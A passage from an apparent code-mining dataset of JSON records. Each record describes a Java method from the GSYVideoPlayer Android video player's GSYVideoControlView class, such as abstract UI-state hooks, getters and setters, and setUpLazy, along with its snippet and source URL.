"snippet": "    protected abstract void dismissVolumeDialog();\n\n    protected abstract void showBrightnessDialog(float percent);\n\n    protected abstract void dismissBrightnessDialog();\n\n    protected abstract void onClickUiToggle();\n\n    protected abstract void hideAllWidget();\n\n    protected abstract void changeUiToNormal();\n\n    protected abstract void changeUiToPreparingShow();\n\n    protected abstract void changeUiToPlayingShow();\n\n    protected abstract void changeUiToPauseShow();\n\n    protected abstract void changeUiToError();\n\n    protected abstract void changeUiToCompleteShow();\n\n    protected abstract void changeUiToPlayingBufferingShow();\n\n\n    /************************* \u5f00\u653e\u63a5\u53e3 *************************/\n\n\n    /**\n     * \u5728\u70b9\u51fb\u64ad\u653e\u7684\u65f6\u5019\u624d\u8fdb\u884c\u771f\u6b63setup\n     */\n    public boolean setUpLazy(String url, boolean cacheWithPlay, File cachePath, Map<String, String> mapHeadData, String title) {\n        mOriginUrl = url;\n        mCache = cacheWithPlay;\n        mCachePath = cachePath;\n        mSetUpLazy = true;\n        mTitle = title;\n        mMapHeadData = mapHeadData;\n        if (isCurrentMediaListener() &&\n                (System.currentTimeMillis() - mSaveChangeViewTIme) < CHANGE_DELAY_TIME)\n            return false;\n        mUrl = \"waiting\";\n        mCurrentState = CURRENT_STATE_NORMAL;\n        return true;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55262, "method_name": "showBrightnessDialog", "class_name": "GSYVideoControlView", "params": ["float"], "throws": null, "modifiers": ["protected", "abstract"], "return_type": "void", "snippet": "    protected abstract void showBrightnessDialog(float percent);\n\n    protected abstract void dismissBrightnessDialog();\n\n    protected abstract void onClickUiToggle();\n\n    protected abstract void hideAllWidget();\n\n    protected abstract void changeUiToNormal();\n\n    protected abstract void changeUiToPreparingShow();\n\n    protected abstract void changeUiToPlayingShow();\n\n    protected abstract void changeUiToPauseShow();\n\n    protected abstract void changeUiToError();\n\n    protected abstract void changeUiToCompleteShow();\n\n    protected abstract void changeUiToPlayingBufferingShow();\n\n\n    /************************* \u5f00\u653e\u63a5\u53e3 *************************/\n\n\n    /**\n     * \u5728\u70b9\u51fb\u64ad\u653e\u7684\u65f6\u5019\u624d\u8fdb\u884c\u771f\u6b63setup\n     */\n    public boolean setUpLazy(String url, boolean cacheWithPlay, File cachePath, Map<String, String> mapHeadData, String title) {\n        mOriginUrl = url;\n        mCache = cacheWithPlay;\n        mCachePath = cachePath;\n        mSetUpLazy = true;\n        mTitle = title;\n        mMapHeadData = mapHeadData;\n        if (isCurrentMediaListener() &&\n                (System.currentTimeMillis() - mSaveChangeViewTIme) < CHANGE_DELAY_TIME)\n            return false;\n        mUrl = \"waiting\";\n        mCurrentState = CURRENT_STATE_NORMAL;\n        return true;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55263, "method_name": "dismissBrightnessDialog", "class_name": "GSYVideoControlView", "params": [], "throws": null, "modifiers": ["protected", "abstract"], "return_type": "void", "snippet": "    protected abstract void dismissBrightnessDialog();\n\n    protected abstract void onClickUiToggle();\n\n    protected abstract void hideAllWidget();\n\n    protected abstract void changeUiToNormal();\n\n    protected abstract void changeUiToPreparingShow();\n\n    protected abstract void changeUiToPlayingShow();\n\n    protected abstract void changeUiToPauseShow();\n\n    protected abstract void changeUiToError();\n\n    protected abstract void changeUiToCompleteShow();\n\n    protected abstract void changeUiToPlayingBufferingShow();\n\n\n    /************************* \u5f00\u653e\u63a5\u53e3 *************************/\n\n\n    /**\n     * \u5728\u70b9\u51fb\u64ad\u653e\u7684\u65f6\u5019\u624d\u8fdb\u884c\u771f\u6b63setup\n     */\n    public boolean setUpLazy(String url, boolean cacheWithPlay, File cachePath, Map<String, String> mapHeadData, String title) {\n        mOriginUrl = url;\n        mCache = cacheWithPlay;\n        mCachePath = cachePath;\n        mSetUpLazy = true;\n        mTitle = title;\n        mMapHeadData = mapHeadData;\n        if (isCurrentMediaListener() &&\n                (System.currentTimeMillis() - mSaveChangeViewTIme) < CHANGE_DELAY_TIME)\n            return false;\n        mUrl = \"waiting\";\n        mCurrentState = CURRENT_STATE_NORMAL;\n        return true;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55264, "method_name": "onClickUiToggle", "class_name": "GSYVideoControlView", "params": [], "throws": null, "modifiers": ["protected", "abstract"], "return_type": "void", "snippet": "    protected abstract void onClickUiToggle();\n\n    protected abstract void hideAllWidget();\n\n    protected abstract void changeUiToNormal();\n\n    protected abstract void changeUiToPreparingShow();\n\n    protected abstract void changeUiToPlayingShow();\n\n    protected abstract void changeUiToPauseShow();\n\n    protected abstract void changeUiToError();\n\n    protected abstract void changeUiToCompleteShow();\n\n    protected abstract void changeUiToPlayingBufferingShow();\n\n\n    /************************* \u5f00\u653e\u63a5\u53e3 *************************/\n\n\n    /**\n     * \u5728\u70b9\u51fb\u64ad\u653e\u7684\u65f6\u5019\u624d\u8fdb\u884c\u771f\u6b63setup\n     */\n    public boolean setUpLazy(String url, boolean cacheWithPlay, File cachePath, Map<String, String> mapHeadData, String title) {\n        mOriginUrl = url;\n        mCache = cacheWithPlay;\n        mCachePath = cachePath;\n        mSetUpLazy = true;\n        mTitle = title;\n        mMapHeadData = mapHeadData;\n        if (isCurrentMediaListener() &&\n                (System.currentTimeMillis() - mSaveChangeViewTIme) < CHANGE_DELAY_TIME)\n            return false;\n        mUrl = \"waiting\";\n        mCurrentState = CURRENT_STATE_NORMAL;\n        return true;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55265, "method_name": "hideAllWidget", "class_name": "GSYVideoControlView", "params": [], "throws": null, "modifiers": ["protected", "abstract"], "return_type": "void", "snippet": "    protected abstract void hideAllWidget();\n\n    protected abstract void changeUiToNormal();\n\n    protected abstract void changeUiToPreparingShow();\n\n    protected abstract void changeUiToPlayingShow();\n\n    protected abstract void changeUiToPauseShow();\n\n    protected abstract void changeUiToError();\n\n    protected abstract void changeUiToCompleteShow();\n\n    protected abstract void changeUiToPlayingBufferingShow();\n\n\n    /************************* \u5f00\u653e\u63a5\u53e3 *************************/\n\n\n    /**\n     * \u5728\u70b9\u51fb\u64ad\u653e\u7684\u65f6\u5019\u624d\u8fdb\u884c\u771f\u6b63setup\n     */\n    public boolean setUpLazy(String url, boolean cacheWithPlay, File cachePath, Map<String, String> mapHeadData, String title) {\n        mOriginUrl = url;\n        mCache = cacheWithPlay;\n        mCachePath = cachePath;\n        mSetUpLazy = true;\n        mTitle = title;\n        mMapHeadData = mapHeadData;\n        if (isCurrentMediaListener() &&\n                (System.currentTimeMillis() - mSaveChangeViewTIme) < CHANGE_DELAY_TIME)\n            return false;\n        mUrl = \"waiting\";\n        mCurrentState = CURRENT_STATE_NORMAL;\n        return true;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55266, "method_name": "changeUiToNormal", "class_name": "GSYVideoControlView", "params": [], "throws": null, "modifiers": ["protected", "abstract"], "return_type": "void", "snippet": "    protected abstract void changeUiToNormal();\n\n    protected abstract void changeUiToPreparingShow();\n\n    protected abstract void changeUiToPlayingShow();\n\n    protected abstract void changeUiToPauseShow();\n\n    protected abstract void changeUiToError();\n\n    protected abstract void changeUiToCompleteShow();\n\n    protected abstract void changeUiToPlayingBufferingShow();\n\n\n    /************************* \u5f00\u653e\u63a5\u53e3 *************************/\n\n\n    /**\n     * \u5728\u70b9\u51fb\u64ad\u653e\u7684\u65f6\u5019\u624d\u8fdb\u884c\u771f\u6b63setup\n     */\n    public boolean setUpLazy(String url, boolean cacheWithPlay, File cachePath, Map<String, String> mapHeadData, String title) {\n        mOriginUrl = url;\n        mCache = cacheWithPlay;\n        mCachePath = cachePath;\n        mSetUpLazy = true;\n        mTitle = title;\n        mMapHeadData = mapHeadData;\n        if (isCurrentMediaListener() &&\n                (System.currentTimeMillis() - mSaveChangeViewTIme) < CHANGE_DELAY_TIME)\n            return false;\n        mUrl = \"waiting\";\n        mCurrentState = CURRENT_STATE_NORMAL;\n        return true;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55267, "method_name": "changeUiToPreparingShow", "class_name": "GSYVideoControlView", "params": [], "throws": null, "modifiers": ["protected", "abstract"], "return_type": "void", "snippet": "    protected abstract void changeUiToPreparingShow();\n\n    protected abstract void changeUiToPlayingShow();\n\n    protected abstract void changeUiToPauseShow();\n\n    protected abstract void changeUiToError();\n\n    protected abstract void changeUiToCompleteShow();\n\n    protected abstract void changeUiToPlayingBufferingShow();\n\n\n    /************************* \u5f00\u653e\u63a5\u53e3 *************************/\n\n\n    /**\n     * \u5728\u70b9\u51fb\u64ad\u653e\u7684\u65f6\u5019\u624d\u8fdb\u884c\u771f\u6b63setup\n     */\n    public boolean setUpLazy(String url, boolean cacheWithPlay, File cachePath, Map<String, String> mapHeadData, String title) {\n        mOriginUrl = url;\n        mCache = cacheWithPlay;\n        mCachePath = cachePath;\n        mSetUpLazy = true;\n        mTitle = title;\n        mMapHeadData = mapHeadData;\n        if (isCurrentMediaListener() &&\n                (System.currentTimeMillis() - mSaveChangeViewTIme) < CHANGE_DELAY_TIME)\n            return false;\n        mUrl = \"waiting\";\n        mCurrentState = CURRENT_STATE_NORMAL;\n        return true;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55268, "method_name": "changeUiToPlayingShow", "class_name": "GSYVideoControlView", "params": [], "throws": null, "modifiers": ["protected", "abstract"], "return_type": "void", "snippet": "    protected abstract void changeUiToPlayingShow();\n\n    protected abstract void changeUiToPauseShow();\n\n    protected abstract void changeUiToError();\n\n    protected abstract void changeUiToCompleteShow();\n\n    protected abstract void changeUiToPlayingBufferingShow();\n\n\n    /************************* \u5f00\u653e\u63a5\u53e3 *************************/\n\n\n    /**\n     * \u5728\u70b9\u51fb\u64ad\u653e\u7684\u65f6\u5019\u624d\u8fdb\u884c\u771f\u6b63setup\n     */\n    public boolean setUpLazy(String url, boolean cacheWithPlay, File cachePath, Map<String, String> mapHeadData, String title) {\n        mOriginUrl = url;\n        mCache = cacheWithPlay;\n        mCachePath = cachePath;\n        mSetUpLazy = true;\n        mTitle = title;\n        mMapHeadData = mapHeadData;\n        if (isCurrentMediaListener() &&\n                (System.currentTimeMillis() - mSaveChangeViewTIme) < CHANGE_DELAY_TIME)\n            return false;\n        mUrl = \"waiting\";\n        mCurrentState = CURRENT_STATE_NORMAL;\n        return true;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55269, "method_name": "changeUiToPauseShow", "class_name": "GSYVideoControlView", "params": [], "throws": null, "modifiers": ["protected", "abstract"], "return_type": "void", "snippet": "    protected abstract void changeUiToPauseShow();\n\n    protected abstract void changeUiToError();\n\n    protected abstract void changeUiToCompleteShow();\n\n    protected abstract void changeUiToPlayingBufferingShow();\n\n\n    /************************* \u5f00\u653e\u63a5\u53e3 *************************/\n\n\n    /**\n     * \u5728\u70b9\u51fb\u64ad\u653e\u7684\u65f6\u5019\u624d\u8fdb\u884c\u771f\u6b63setup\n     */\n    public boolean setUpLazy(String url, boolean cacheWithPlay, File cachePath, Map<String, String> mapHeadData, String title) {\n        mOriginUrl = url;\n        mCache = cacheWithPlay;\n        mCachePath = cachePath;\n        mSetUpLazy = true;\n        mTitle = title;\n        mMapHeadData = mapHeadData;\n        if (isCurrentMediaListener() &&\n                (System.currentTimeMillis() - mSaveChangeViewTIme) < CHANGE_DELAY_TIME)\n            return false;\n        mUrl = \"waiting\";\n        mCurrentState = CURRENT_STATE_NORMAL;\n        return true;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55270, "method_name": "changeUiToError", "class_name": "GSYVideoControlView", "params": [], "throws": null, "modifiers": ["protected", "abstract"], "return_type": "void", "snippet": "    protected abstract void changeUiToError();\n\n    protected abstract void changeUiToCompleteShow();\n\n    protected abstract void changeUiToPlayingBufferingShow();\n\n\n    /************************* \u5f00\u653e\u63a5\u53e3 *************************/\n\n\n    /**\n     * \u5728\u70b9\u51fb\u64ad\u653e\u7684\u65f6\u5019\u624d\u8fdb\u884c\u771f\u6b63setup\n     */\n    public boolean setUpLazy(String url, boolean cacheWithPlay, File cachePath, Map<String, String> mapHeadData, String title) {\n        mOriginUrl = url;\n        mCache = cacheWithPlay;\n        mCachePath = cachePath;\n        mSetUpLazy = true;\n        mTitle = title;\n        mMapHeadData = mapHeadData;\n        if (isCurrentMediaListener() &&\n                (System.currentTimeMillis() - mSaveChangeViewTIme) < CHANGE_DELAY_TIME)\n            return false;\n        mUrl = \"waiting\";\n        mCurrentState = CURRENT_STATE_NORMAL;\n        return true;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55271, "method_name": "changeUiToCompleteShow", "class_name": "GSYVideoControlView", "params": [], "throws": null, "modifiers": ["protected", "abstract"], "return_type": "void", "snippet": "    protected abstract void changeUiToCompleteShow();\n\n    protected abstract void changeUiToPlayingBufferingShow();\n\n\n    /************************* \u5f00\u653e\u63a5\u53e3 *************************/\n\n\n    /**\n     * \u5728\u70b9\u51fb\u64ad\u653e\u7684\u65f6\u5019\u624d\u8fdb\u884c\u771f\u6b63setup\n     */\n    public boolean setUpLazy(String url, boolean cacheWithPlay, File cachePath, Map<String, String> mapHeadData, String title) {\n        mOriginUrl = url;\n        mCache = cacheWithPlay;\n        mCachePath = cachePath;\n        mSetUpLazy = true;\n        mTitle = title;\n        mMapHeadData = mapHeadData;\n        if (isCurrentMediaListener() &&\n                (System.currentTimeMillis() - mSaveChangeViewTIme) < CHANGE_DELAY_TIME)\n            return false;\n        mUrl = \"waiting\";\n        mCurrentState = CURRENT_STATE_NORMAL;\n        return true;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55272, "method_name": "changeUiToPlayingBufferingShow", "class_name": "GSYVideoControlView", "params": [], "throws": null, "modifiers": ["protected", "abstract"], "return_type": "void", "snippet": "    protected abstract void changeUiToPlayingBufferingShow();\n\n\n    /************************* \u5f00\u653e\u63a5\u53e3 *************************/\n\n\n    /**\n     * \u5728\u70b9\u51fb\u64ad\u653e\u7684\u65f6\u5019\u624d\u8fdb\u884c\u771f\u6b63setup\n     */\n    public boolean setUpLazy(String url, boolean cacheWithPlay, File cachePath, Map<String, String> mapHeadData, String title) {\n        mOriginUrl = url;\n        mCache = cacheWithPlay;\n        mCachePath = cachePath;\n        mSetUpLazy = true;\n        mTitle = title;\n        mMapHeadData = mapHeadData;\n        if (isCurrentMediaListener() &&\n                (System.currentTimeMillis() - mSaveChangeViewTIme) < CHANGE_DELAY_TIME)\n            return false;\n        mUrl = \"waiting\";\n        mCurrentState = CURRENT_STATE_NORMAL;\n        return true;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55273, "method_name": "setUpLazy", "class_name": "GSYVideoControlView", "params": ["String", "boolean", "File", "Map<String,String>", "String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean setUpLazy(String url, boolean cacheWithPlay, File cachePath, Map<String, String> mapHeadData, String title) {\n        mOriginUrl = url;\n        mCache = cacheWithPlay;\n        mCachePath = cachePath;\n        mSetUpLazy = true;\n        mTitle = title;\n        mMapHeadData = mapHeadData;\n        if (isCurrentMediaListener() &&\n                (System.currentTimeMillis() - mSaveChangeViewTIme) < CHANGE_DELAY_TIME)\n            return false;\n        mUrl = \"waiting\";\n        mCurrentState = CURRENT_STATE_NORMAL;\n        return true;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55274, "method_name": "initUIState", "class_name": "GSYVideoControlView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void initUIState() {\n        setStateAndUi(CURRENT_STATE_NORMAL);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55275, "method_name": "getThumbImageViewLayout", "class_name": "GSYVideoControlView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "RelativeLayout", "snippet": "    public RelativeLayout getThumbImageViewLayout() {\n        return mThumbImageViewLayout;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55276, "method_name": "setThumbImageView", "class_name": "GSYVideoControlView", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setThumbImageView(View view) {\n        if (mThumbImageViewLayout != null) {\n            mThumbImageView = view;\n            resolveThumbImage(view);\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55277, "method_name": "clearThumbImageView", "class_name": "GSYVideoControlView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void clearThumbImageView() {\n        if (mThumbImageViewLayout != null) {\n            mThumbImageViewLayout.removeAllViews();\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55278, "method_name": "getThumbImageView", "class_name": "GSYVideoControlView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "View", "snippet": "    public View getThumbImageView() {\n        return mThumbImageView;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55279, "method_name": "getTitleTextView", "class_name": "GSYVideoControlView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "TextView", "snippet": "    public TextView getTitleTextView() {\n        return mTitleTextView;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55280, "method_name": "getStartButton", "class_name": "GSYVideoControlView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "View", "snippet": "    public View getStartButton() {\n        return mStartButton;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55281, "method_name": "getFullscreenButton", "class_name": "GSYVideoControlView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ImageView", "snippet": "    public ImageView getFullscreenButton() {\n        return mFullscreenButton;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55282, "method_name": "getBackButton", "class_name": "GSYVideoControlView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ImageView", "snippet": "    public ImageView getBackButton() {\n        return mBackButton;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55283, "method_name": "getEnlargeImageRes", "class_name": "GSYVideoControlView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getEnlargeImageRes() {\n        if (mEnlargeImageRes == -1) {\n            return R.drawable.video_enlarge;\n        }\n        return mEnlargeImageRes;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55284, "method_name": "setEnlargeImageRes", "class_name": "GSYVideoControlView", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setEnlargeImageRes(int mEnlargeImageRes) {\n        this.mEnlargeImageRes = mEnlargeImageRes;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55285, "method_name": "getShrinkImageRes", "class_name": "GSYVideoControlView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getShrinkImageRes() {\n        if (mShrinkImageRes == -1) {\n            return R.drawable.video_shrink;\n        }\n        return mShrinkImageRes;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55286, "method_name": "setShrinkImageRes", "class_name": "GSYVideoControlView", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setShrinkImageRes(int mShrinkImageRes) {\n        this.mShrinkImageRes = mShrinkImageRes;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55287, "method_name": "setIsTouchWigetFull", "class_name": "GSYVideoControlView", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setIsTouchWigetFull(boolean isTouchWigetFull) {\n        this.mIsTouchWigetFull = isTouchWigetFull;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55288, "method_name": "setThumbPlay", "class_name": "GSYVideoControlView", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setThumbPlay(boolean thumbPlay) {\n        this.mThumbPlay = thumbPlay;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55289, "method_name": "isHideKey", "class_name": "GSYVideoControlView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isHideKey() {\n        return mHideKey;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55290, "method_name": "setHideKey", "class_name": "GSYVideoControlView", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setHideKey(boolean hideKey) {\n        this.mHideKey = hideKey;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55291, "method_name": "isNeedShowWifiTip", "class_name": "GSYVideoControlView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isNeedShowWifiTip() {\n        return mNeedShowWifiTip;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55292, "method_name": "isTouchWiget", "class_name": "GSYVideoControlView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isTouchWiget() {\n        return mIsTouchWiget;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55293, "method_name": "setIsTouchWiget", "class_name": "GSYVideoControlView", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setIsTouchWiget(boolean isTouchWiget) {\n        this.mIsTouchWiget = isTouchWiget;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55294, "method_name": "isTouchWigetFull", "class_name": "GSYVideoControlView", "params": [], "throws": null, 